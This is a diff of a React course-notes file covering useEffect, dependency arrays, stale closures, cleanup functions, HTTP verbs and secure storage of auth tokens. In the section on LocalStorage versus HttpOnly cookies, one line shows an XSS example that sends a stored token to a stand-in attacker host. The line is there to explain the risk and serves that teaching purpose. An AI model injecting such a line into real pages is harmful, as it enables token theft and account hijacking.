-              <li><strong>The Cargo (Side Effects):</strong> Represents heavyweight, unpredictable asynchronous operations—such as remote API latency, database queries, and timers.</li>
+
+            <ul class="notes-bullet-list">
+              <li><strong>The Blue Truck = React's Main Render Engine:</strong>
+                <ul class="notes-sub-list">
+                  <li>The truck's sole mission is to haul UI elements onto the screen as fast as possible (60 to 120 times every second).</li>
+                </ul>
+              </li>
+              <li><strong>Dumping Cargo on the Truck (The Direct Call Mistake):</strong>
+                <ul class="notes-sub-list">
+                  <li>If you call an API (or start a timer) directly in the body of your component, you are dumping heavy bricks directly onto the truck while it is driving!</li>
+                  <li>Every single time any state changes, the component executes from top to bottom, forcing the truck to re-run your heavy network requests over and over, slowing the site to a crawl.</li>
+                </ul>
+              </li>
+              <li><strong>The Solution — <code>useEffect</code> (The Side Lane):</strong>
+                <ul class="notes-sub-list">
+                  <li><code>useEffect</code> takes your side tasks off the main highway and moves them onto a <strong>side service road</strong>.</li>
+                  <li>React finishes building and painting the UI on screen first (the truck arrives smoothly). Only *after* the browser screen is painted does React execute the tasks parked in your <code>useEffect</code> lane!</li>
+                </ul>
+              </li>
             </ul>
-            <p>
-              If heavy cargo is loaded directly into the driver’s cabin while the truck is navigating rush hour traffic, the truck stalls, creating a massive traffic jam (frozen UI frames).
-            </p>
-            <p>
-              <strong>The Solution:</strong> <code>useEffect</code> acts as a dedicated <strong>side service lane</strong>. React tells the truck: <em>"Finish delivering the UI pixels to the screen first. Once the road is clear and the user sees the page, I will process the cargo in the side lane."</em>
-            </p>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -6997,8 +7611,8 @@ export default App</code></pre>
                   <!-- Anti Pattern -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="140" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--border)" stroke-width="1.2"/>
-                    <text x="85" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">UNCONTROLLED EXECUTION</text>
+                    <rect x="15" y="15" width="189" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--border)" stroke-width="1.2"/>
+                    <text x="109.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">UNCONTROLLED EXECUTION</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title">Direct In-Body Call (Bottleneck)</text>
 
                     <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -7011,8 +7625,8 @@ export default App</code></pre>
                   <!-- Production Pattern -->
                   <g transform="translate(455, 20)">
                     <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="130" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="80" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">USEEFFECT SHIELD</text>
+                    <rect x="15" y="15" width="145" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="87.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">USEEFFECT SHIELD</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title">Decoupled Side Lane Execution</text>
 
                     <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -7024,79 +7638,90 @@ export default App</code></pre>
                 </svg>
               </div>
             </figure>
+          `
+        },
+        {
+          num: "35.3",
+          title: "The Infinite Loop Trap of Unshielded State Setters",
+          content: `
+            <p>
+              Here is the classic bug that every beginner writes when first trying to fetch data:
+            </p>
 
-            <div class="takeaways-box">
-              <div class="takeaways-title">Key Architectural Principles</div>
-              <ul>
-                <li><strong>Render Purity:</strong> Component bodies must remain pure mathematical functions mapping state/props to JSX.</li>
-                <li><strong>Deferred Execution:</strong> <code>useEffect</code> callbacks execute strictly after the browser paints the current frame, ensuring zero input latency for user clicks and keyboard events.</li>
-              </ul>
-            </div>
+            <pre class="notes-code-block"><code>function BrokenComponent() {
+  const [data, setData] = useState([]);
+
+  // ❌ FATAL INFINITE LOOP BUG:
+  // 1. Component renders
+  // 2. fetch runs directly in component body
+  // 3. .then() calls setData(result)
+  // 4. State updates &rarr; triggers component re-render
+  // 5. Component renders &rarr; fetch runs AGAIN!
+  fetch('https://api.example.com/items')
+    .then(res => res.json())
+    .then(result => setData(result)); // Crash! React limits re-renders!
+
+  return &lt;div&gt;Items count: {data.length}&lt;/div&gt;;
+}</code></pre>
+
+            <p>
+              <strong>The Fix:</strong> Wrap the side effect inside <code>useEffect(() =&gt; { ... }, [])</code>. The dependency array tells React to run the effect once when the component mounts, and never re-trigger it on subsequent re-renders!
+            </p>
           `
         }
       ]
     },
+
+    /* ═══════════════════════════════════════════════════════════════
+       TOPIC 36
+       ═══════════════════════════════════════════════════════════════ */
     {
-      id: 'react-36',
-      number: 36,
-      shortLabel: 'React 36',
-      title: 'The Dependency Array & Lifecycle Execution Patterns',
-      summary: 'Mastering the three execution modes of useEffect via the dependency array: Unbounded execution, initial mount only (componentDidMount), and surgical re-execution on state mutation, plus cleanup functions and StrictMode dev behavior.',
-      subtopicLabels: [
-        '36.1 The 3 Dependency Array Modes',
-        '36.2 Practical State-Watching Pattern',
-        '36.3 Multiple Hooks, StrictMode & Cleanup'
-      ],
+      id: "react-36-dependency-array-patterns",
+      number: "36",
+      shortLabel: "Dependency Array & Lifecycles",
+      title: "The Dependency Array & Lifecycle Execution Patterns",
+      summary: "Mastering the three modes of the useEffect dependency array (no array, empty array, filled array), stale closures in effects, and cleanup functions for timers, sockets, and abort controllers.",
+      subtopicLabels: ["36.1 The 3 Dependency Modes", "36.2 The Stale Closure Trap", "36.3 Cleanup Functions & Memory Leak Prevention"],
       diagramCount: 2,
       sections: [
         {
-          id: 'react-36-1',
-          num: '36.1',
-          title: 'The 3 Execution Modes of useEffect Controlled by Dependencies',
+          num: "36.1",
+          title: "The 3 Modes of the Dependency Array (Execution Triggers)",
           content: `
             <p>
-              The <code>useEffect</code> hook accepts two arguments:
-            </p>
-            <ol>
-              <li><strong>Effect Callback:</strong> The function encapsulating the side-effect logic.</li>
-              <li><strong>Dependency Array (Optional):</strong> An array of values (state or props) that React tracks between renders.</li>
-            </ol>
-            <p>
-              The presence and structure of this array determines which of the three lifecycle execution modes React activates:
+              <code>useEffect</code> accepts two parameters: a <strong>callback function</strong> and an optional <strong>dependency array</strong>:
             </p>
 
-            <div class="table-wrap">
-              <table class="notes-table">
-                <thead>
-                  <tr>
-                    <th>Syntax</th>
-                    <th>Execution Trigger</th>
-                    <th>Lifecycle Equivalent</th>
-                    <th>Standard Use Case</th>
-                  </tr>
-                </thead>
-                <tbody>
-                  <tr>
-                    <td><code>useEffect(fn)</code></td>
-                    <td>After <strong>every single render</strong> and state mutation</td>
-                    <td><code>componentDidMount</code> + <code>componentDidUpdate</code></td>
-                    <td>Global logging, metrics tracking (rarely needed)</td>
-                  </tr>
-                  <tr>
-                    <td><code>useEffect(fn, [])</code></td>
-                    <td>Runs <strong>exactly once</strong> when component mounts</td>
-                    <td><code>componentDidMount</code></td>
-                    <td>Initial API load, WebSocket init, event listener bind</td>
-                  </tr>
-                  <tr>
-                    <td><code>useEffect(fn, [a, b])</code></td>
-                    <td>Runs on mount AND when <code>a</code> or <code>b</code> mutates</td>
-                    <td>Targeted <code>componentDidUpdate</code></td>
-                    <td>Filtered search query, page pagination, id-based fetching</td>
-                  </tr>
-                </tbody>
-              </table>
-            </div>
+            <pre class="notes-code-block"><code>useEffect(() => {
+  // Side effect logic here
+}, [dependency1, dependency2]);</code></pre>
+
+            <ul class="notes-bullet-list">
+              <li><strong>Mode 1: No Dependency Array Provided:</strong>
+                <pre class="notes-code-block"><code>useEffect(() => {
+  console.log('Runs on mount AND after EVERY single render!');
+});</code></pre>
+                <ul class="notes-sub-list">
+                  <li>Executes on initial component mount and re-runs after <strong>every single state or prop change</strong>. Rarely used in production because it easily triggers performance bottlenecks.</li>
+                </ul>
+              </li>
+              <li><strong>Mode 2: Empty Dependency Array (<code>[]</code>):</strong>
+                <pre class="notes-code-block"><code>useEffect(() => {
+  console.log('Runs EXACTLY ONCE on initial mount!');
+}, []);</code></pre>
+                <ul class="notes-sub-list">
+                  <li>Tells React: <em>"This effect depends on nothing."</em> Executes exactly once when the component first mounts into the DOM (analogous to <code>componentDidMount</code> in class components). Perfect for initial API fetches and window listener registration.</li>
+                </ul>
+              </li>
+              <li><strong>Mode 3: Array With Dependencies (<code>[count, query]</code>):</strong>
+                <pre class="notes-code-block"><code>useEffect(() => {
+  console.log('Runs on mount AND whenever count changes:', count);
+}, [count]);</code></pre>
+                <ul class="notes-sub-list">
+                  <li>Executes on initial mount, and then re-runs <strong>only when one of the specified dependencies changes</strong> (via <code>Object.is</code> reference comparison).</li>
+                </ul>
+              </li>
+            </ul>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -7149,50 +7774,39 @@ export default App</code></pre>
           `
         },
         {
-          id: 'react-36-2',
-          num: '36.2',
-          title: 'Practical State-Watching Implementation',
+          num: "36.2",
+          title: "The Stale Closure Trap in useEffect",
           content: `
             <p>
-              In production, components frequently maintain multiple state variables (e.g., <code>a</code> and <code>b</code>). By passing specific variables into the dependency array, React ignores mutations to other states:
+              One of the trickiest bugs in React is the <strong>Stale Closure</strong>. JavaScript functions create closures over the variables in their surrounding lexical scope at the time they are created.
             </p>
 
-            <pre class="notes-code-block"><code>import React, { useEffect, useState } from 'react'
+            <ul class="notes-bullet-list">
+              <li><strong>The Stale Timer Bug:</strong>
+                <pre class="notes-code-block"><code>function StaleTimer() {
+  const [count, setCount] = useState(0);
 
-const CounterComparison = () => {
-  const [a, setA] = useState(0)
-  const [b, setB] = useState(0)
-
-  // Subscribed specifically to 'a'
-  // Ignores all changes to 'b' entirely
   useEffect(() => {
-    console.log('State a updated to:', a)
-  }, [a]) // Dependency array watches 'a' only
+    const timer = setInterval(() => {
+      // ❌ STALE CLOSURE BUG:
+      // This interval was created on mount when count was 0.
+      // Because dependency array is empty [], it NEVER re-creates!
+      // Every second it sets count to 0 + 1 = 1! Count is stuck at 1!
+      setCount(count + 1);
+    }, 1000);
 
-  return (
-    &lt;div className="p-6 border rounded-lg"&gt;
-      &lt;h2&gt;A: {a} | B: {b}&lt;/h2&gt;
-      &lt;button onClick={() =&gt; setA(prev =&gt; prev + 1)}&gt;Increment A (Triggers Effect)&lt;/button&gt;
-      &lt;button onClick={() =&gt; setB(prev =&gt; prev - 1)}&gt;Decrement B (Zero Effect)&lt;/button&gt;
-    &lt;/div&gt;
-  )
-}
+    return () => clearInterval(timer);
+  }, []); // Notice empty array!
 
-export default CounterComparison</code></pre>
-          `
-        },
-        {
-          id: 'react-36-3',
-          num: '36.3',
-          title: 'Multiple Hooks, StrictMode Double Invocations & Cleanup Functions',
-          content: `
-            <p>
-              To maintain robust applications, senior engineers follow three essential <code>useEffect</code> guidelines:
-            </p>
-            <ul>
-              <li><strong>Separation of Concerns:</strong> You are not restricted to one hook. Split independent concerns into distinct <code>useEffect</code> hooks (e.g., one for user session heartbeat, another for page search query updates).</li>
-              <li><strong>Why Does useEffect Run Twice in Dev Mode?</strong> When wrapped with <code>&lt;React.StrictMode&gt;</code> in <code>main.jsx</code>, React intentionally mounts, unmounts, and re-mounts every component during local development to expose memory leaks and missing cleanup functions. In production builds, this double invocation is automatically disabled.</li>
-              <li><strong>The Cleanup Function:</strong> When an effect sets up subscriptions, intervals, or WebSocket connections, it must return a cleanup function. React invokes this cleanup before re-running the effect on dependency change and when the component unmounts from the DOM.</li>
+  return &lt;h1&gt;Count: {count}&lt;/h1&gt;;
+}</code></pre>
+              </li>
+              <li><strong>How to Solve Stale Closures:</strong>
+                <ul class="notes-sub-list">
+                  <li><strong>Solution A (Functional Updater):</strong> Replace <code>setCount(count + 1)</code> with <code>setCount(prev =&gt; prev + 1)</code>. The functional updater does not rely on the closed-over <code>count</code> variable!</li>
+                  <li><strong>Solution B (Include Dependency):</strong> Add <code>count</code> to the dependency array <code>[count]</code> so the effect re-runs and captures the latest state snapshot.</li>
+                </ul>
+              </li>
             </ul>
 
             <figure class="diagram-frame">
@@ -7205,8 +7819,8 @@ export default CounterComparison</code></pre>
                   <!-- Step 1: Mount -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="70" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="50" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STAGE 1</text>
+                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STAGE 1</text>
                     <text x="90" y="56" text-anchor="middle" class="svg-title">Initial Mount</text>
                     <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                     <text x="25" y="94" class="svg-mono-xs">1. Component Mount</text>
@@ -7217,8 +7831,8 @@ export default CounterComparison</code></pre>
                   <!-- Step 2: Delta -->
                   <g transform="translate(245, 20)">
                     <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="70" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="50" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STAGE 2</text>
+                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STAGE 2</text>
                     <text x="90" y="56" text-anchor="middle" class="svg-title">State Mutation</text>
                     <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                     <text x="25" y="94" class="svg-mono-xs">State 'a' changes</text>
@@ -7229,8 +7843,8 @@ export default CounterComparison</code></pre>
                   <!-- Step 3: Cleanup -->
                   <g transform="translate(465, 20)">
                     <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="70" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="50" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STAGE 3</text>
+                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STAGE 3</text>
                     <text x="90" y="56" text-anchor="middle" class="svg-title">Run Cleanup</text>
                     <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                     <text x="25" y="94" class="svg-mono-xs">return () =&gt; {</text>
@@ -7241,8 +7855,8 @@ export default CounterComparison</code></pre>
                   <!-- Step 4: Re-execution -->
                   <g transform="translate(675, 20)">
                     <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="70" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="50" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STAGE 4</text>
+                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STAGE 4</text>
                     <text x="90" y="56" text-anchor="middle" class="svg-title">Re-Run Effect</text>
                     <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                     <text x="25" y="94" class="svg-mono-xs">Effect re-runs</text>
@@ -7253,89 +7867,96 @@ export default CounterComparison</code></pre>
               </div>
             </figure>
           `
+        },
+        {
+          num: "36.3",
+          title: "Cleanup Functions & Memory Leak Prevention",
+          content: `
+            <p>
+              When a component unmounts (e.g. user navigates to another page), any running intervals, open WebSockets, or global event listeners left behind continue running in background RAM, causing severe memory leaks.
+            </p>
+
+            <ul class="notes-bullet-list">
+              <li><strong>The Cleanup Function (<code>return () =&gt; { ... }</code>):</strong>
+                <ul class="notes-sub-list">
+                  <li>If your <code>useEffect</code> returns a function, React will automatically invoke that cleanup function in two situations:
+                    <br>1. <strong>Before re-running the effect</strong> with new dependencies (cleaning up the previous run).
+                    <br>2. <strong>When the component unmounts</strong> from the screen.
+                  </li>
+                </ul>
+              </li>
+            </ul>
+
+            <pre class="notes-code-block"><code>import React, { useState, useEffect } from 'react';
+
+function WindowResizeTracker() {
+  const [windowWidth, setWindowWidth] = useState(window.innerWidth);
+
+  useEffect(() => {
+    const handleResize = () => setWindowWidth(window.innerWidth);
+
+    // 1. Set up external event listener
+    window.addEventListener('resize', handleResize);
+
+    // 2. Return cleanup function to detach listener when component unmounts!
+    return () => {
+      console.log('Cleaning up resize listener to prevent memory leak.');
+      window.removeEventListener('resize', handleResize);
+    };
+  }, []); // Run setup on mount, cleanup on unmount
+
+  return &lt;div className="p-4"&gt;Current Screen Width: {windowWidth}px&lt;/div&gt;;
+}
+
+export default WindowResizeTracker;</code></pre>
+          `
         }
       ]
     },
+
+    /* ═══════════════════════════════════════════════════════════════
+       TOPIC 37
+       ═══════════════════════════════════════════════════════════════ */
     {
-      id: 'react-37',
-      number: 37,
-      shortLabel: 'React 37',
-      title: 'HTTP Methods, JSON Wire Protocol & Cookie Storage',
-      summary: 'Client-server communication fundamentals for frontend engineers: RESTful HTTP verbs (GET, POST, PATCH, DELETE) mapped to Axios methods, JSON wire serialization, and why production authentication relies on browser Cookies over LocalStorage.',
-      subtopicLabels: [
-        '37.1 HTTP Verbs & Axios Method Mapping',
-        '37.2 Cookies vs. LocalStorage for Auth Tokens'
-      ],
+      id: "react-37-http-methods-json-cookie-storage",
+      number: "37",
+      shortLabel: "HTTP Methods & Auth Storage",
+      title: "HTTP Methods, JSON Wire Protocol & Cookie Storage",
+      summary: "Client-server communication fundamentals for frontend engineers: RESTful HTTP verbs (GET, POST, PATCH, DELETE), JSON wire serialization, and why production authentication relies on HttpOnly cookies over LocalStorage.",
+      subtopicLabels: ["37.1 RESTful HTTP Verbs & CRUD Operations", "37.2 Security Architecture: LocalStorage vs HttpOnly Cookies"],
       diagramCount: 2,
       sections: [
         {
-          id: 'react-37-1',
-          num: '37.1',
-          title: 'How Data Moves Across the Web: HTTP Verbs & Axios Mappings',
+          num: "37.1",
+          title: "RESTful HTTP Verbs & CRUD Operations",
           content: `
             <p>
-              Modern frontend client applications exchange data with cloud backend microservices using the <strong>HTTP (Hypertext Transfer Protocol)</strong> suite. Information is serialized primarily as <strong>JSON</strong> (JavaScript Object Notation) or occasionally XML.
-            </p>
-            <p>
-              When issuing requests via <strong>Axios</strong>, developers select specific HTTP verbs matching the CRUD (Create, Read, Update, Delete) intent of the operation:
+              Modern frontend client applications exchange data with cloud backend microservices using the HTTP (Hypertext Transfer Protocol) suite. When issuing requests via Axios or fetch, developers select specific HTTP verbs matching the CRUD intent of the operation:
             </p>
 
-            <div class="table-wrap">
-              <table class="notes-table">
-                <thead>
-                  <tr>
-                    <th>HTTP Method</th>
-                    <th>Axios Signature</th>
-                    <th>Operation Intent</th>
-                    <th>Payload Body?</th>
-                    <th>Idempotent?</th>
-                  </tr>
-                </thead>
-                <tbody>
-                  <tr>
-                    <td><strong>GET</strong></td>
-                    <td><code>axios.get(url)</code></td>
-                    <td>Read/Retrieve resources from database</td>
-                    <td>No (URL Query Strings only)</td>
-                    <td>Yes (Repeated calls return identical state)</td>
-                  </tr>
-                  <tr>
-                    <td><strong>POST</strong></td>
-                    <td><code>axios.post(url, payload)</code></td>
-                    <td>Submit new record / trigger business logic</td>
-                    <td>Yes (Request Body: <code>{ user, pass }</code>)</td>
-                    <td>No (Repeated calls create duplicate records)</td>
-                  </tr>
-                  <tr>
-                    <td><strong>PATCH</strong></td>
-                    <td><code>axios.patch(url, delta)</code></td>
-                    <td>Partial update of an existing resource</td>
-                    <td>Yes (Only modified fields sent)</td>
-                    <td>No</td>
-                  </tr>
-                  <tr>
-                    <td><strong>DELETE</strong></td>
-                    <td><code>axios.delete(url)</code></td>
-                    <td>Permanently destroy a resource by ID</td>
-                    <td>No (Identifier passed in URL)</td>
-                    <td>Yes (Deleting an already deleted item has no further side effect)</td>
-                  </tr>
-                </tbody>
-              </table>
-            </div>
-
-            <pre class="notes-code-block"><code>// Example: Dispatching an authenticated login payload via POST
-const handleLogin = async (credentials) =&gt; {
-  try {
-    const response = await axios.post('https://api.domain.com/v1/auth/login', {
-      username: credentials.email,
-      password: credentials.password
-    })
-    console.log('Session established:', response.data)
-  } catch (err) {
-    console.error('Authentication rejected:', err.response?.data?.message)
-  }
-}</code></pre>
+            <ul class="notes-bullet-list">
+              <li><strong>1. GET (Read):</strong>
+                <ul class="notes-sub-list">
+                  <li>Retrieves resources from the server without causing side effects. Must be <strong>Idempotent</strong> (calling it 100 times produces identical results). Has no request body (parameters are sent via URL query string).</li>
+                </ul>
+              </li>
+              <li><strong>2. POST (Create):</strong>
+                <ul class="notes-sub-list">
+                  <li>Creates a new record on the server (e.g. creating a new user or order). <strong>Non-idempotent</strong> (submitting twice creates two distinct records). Payload is transmitted in the JSON request body.</li>
+                </ul>
+              </li>
+              <li><strong>3. PATCH vs. PUT (Update):</strong>
+                <ul class="notes-sub-list">
+                  <li><strong>PUT:</strong> Replaces the entire target resource with the new payload.</li>
+                  <li><strong>PATCH:</strong> Applies a <strong>partial update</strong> (e.g. modifying only the user's <code>email</code> without re-sending their password and address). Preferred in modern REST APIs for efficiency.</li>
+                </ul>
+              </li>
+              <li><strong>4. DELETE (Remove):</strong>
+                <ul class="notes-sub-list">
+                  <li>Deletes the target resource specified by ID in the URL path (e.g. <code>DELETE /api/notes/42</code>). Idempotent.</li>
+                </ul>
+              </li>
+            </ul>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -7359,8 +7980,8 @@ const handleLogin = async (credentials) =&gt; {
                   <!-- POST -->
                   <g transform="translate(245, 20)">
                     <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="55" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="42" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">POST</text>
+                    <rect x="15" y="15" width="56" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="43" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">POST</text>
                     <text x="90" y="56" text-anchor="middle" class="svg-title">Create Record</text>
                     <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                     <text x="25" y="94" class="svg-mono-xs">axios.post('/auth')</text>
@@ -7371,8 +7992,8 @@ const handleLogin = async (credentials) =&gt; {
                   <!-- PATCH -->
                   <g transform="translate(465, 20)">
                     <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="60" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="45" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">PATCH</text>
+                    <rect x="15" y="15" width="63" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="46.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">PATCH</text>
                     <text x="90" y="56" text-anchor="middle" class="svg-title">Partial Delta</text>
                     <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                     <text x="25" y="94" class="svg-mono-xs">axios.patch('/user')</text>
@@ -7383,8 +8004,8 @@ const handleLogin = async (credentials) =&gt; {
                   <!-- DELETE -->
                   <g transform="translate(675, 20)">
                     <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="65" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="47" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">DELETE</text>
+                    <rect x="15" y="15" width="71" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="50.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">DELETE</text>
                     <text x="90" y="56" text-anchor="middle" class="svg-title">Remove Item</text>
                     <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                     <text x="25" y="94" class="svg-mono-xs">axios.delete('/card')</text>
@@ -7397,19 +8018,30 @@ const handleLogin = async (credentials) =&gt; {
           `
         },
         {
-          id: 'react-37-2',
-          num: '37.2',
-          title: 'Cookies vs. LocalStorage for Production Authentication',
+          num: "37.2",
+          title: "Security Architecture: Why LocalStorage is Vulnerable to XSS Token Theft",
           content: `
             <p>
-              In production engineering interviews, a classic question asks: <em>"Where should JWT auth tokens (accessToken, refreshToken) be stored in the client browser?"</em>
+              In full-stack and frontend system design interviews, a common question is: <em>"Where should you store JWT authentication tokens in the browser?"</em>
             </p>
-            <p>
-              While beginner tutorials save tokens in <code>localStorage</code>, production applications universally favor <strong>HTTP-Only, Secure Cookies</strong>:
-            </p>
-            <ul>
-              <li><strong>The Vulnerability of LocalStorage:</strong> Any script running on your page (including third-party tracking libraries or compromised npm packages) has direct read access to <code>localStorage.getItem('token')</code>. An attacker injecting malicious JavaScript (Cross-Site Scripting, or XSS) can instantly exfiltrate tokens and hijack user accounts.</li>
-              <li><strong>The Security of HttpOnly Cookies:</strong> When a server flags a cookie as <code>HttpOnly; Secure; SameSite=Lax</code>, client-side JavaScript is completely blocked from reading the cookie value (preventing XSS theft). The browser automatically includes the cookie in every outgoing HTTP request header without manual code intervention.</li>
+
+            <ul class="notes-bullet-list">
+              <li><strong>The LocalStorage Flaw (Vulnerable to XSS):</strong>
+                <ul class="notes-sub-list">
+                  <li>Any JavaScript code running on your page has unrestricted read access to <code>localStorage</code>.</li>
+                  <li>If your application has a single Cross-Site Scripting (XSS) vulnerability (e.g. through an unescaped comment or a compromised third-party npm package), an attacker can execute <code>fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))</code> and instantly hijack your user's account!</li>
+                </ul>
+              </li>
+              <li><strong>The Production Standard: <code>HttpOnly; Secure; SameSite=Strict</code> Cookies:</strong>
+                <ul class="notes-sub-list">
+                  <li>When the user logs in, the backend sends the session token in a <code>Set-Cookie</code> HTTP response header with flags:
+                    <br>&bull; <strong><code>HttpOnly</code>:</strong> Completely blocks JavaScript from accessing the cookie via <code>document.cookie</code>. Even if your app has an XSS bug, the attacker cannot steal the token!
+                    <br>&bull; <strong><code>Secure</code>:</strong> Ensures the cookie is only transmitted over encrypted HTTPS connections.
+                    <br>&bull; <strong><code>SameSite=Strict</code> (or Lax):</strong> Prevents Cross-Site Request Forgery (CSRF) by preventing external sites from sending the cookie with forged requests.
+                  </li>
+                  <li>The browser automatically attaches the cookie to every subsequent request to your API domain—zero manual JavaScript code required!</li>
+                </ul>
+              </li>
             </ul>
 
             <figure class="diagram-frame">
@@ -7422,8 +8054,8 @@ const handleLogin = async (credentials) =&gt; {
                   <!-- LocalStorage (Insecure) -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--border)" stroke-width="1.2"/>
-                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">LOCALSTORAGE APPROACH</text>
+                    <rect x="15" y="15" width="182" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--border)" stroke-width="1.2"/>
+                    <text x="106" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">LOCALSTORAGE APPROACH</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title">Client-Readable (XSS Vulnerable)</text>
 
                     <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -7436,8 +8068,8 @@ const handleLogin = async (credentials) =&gt; {
                   <!-- HttpOnly Cookies (Secure) -->
                   <g transform="translate(455, 20)">
                     <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
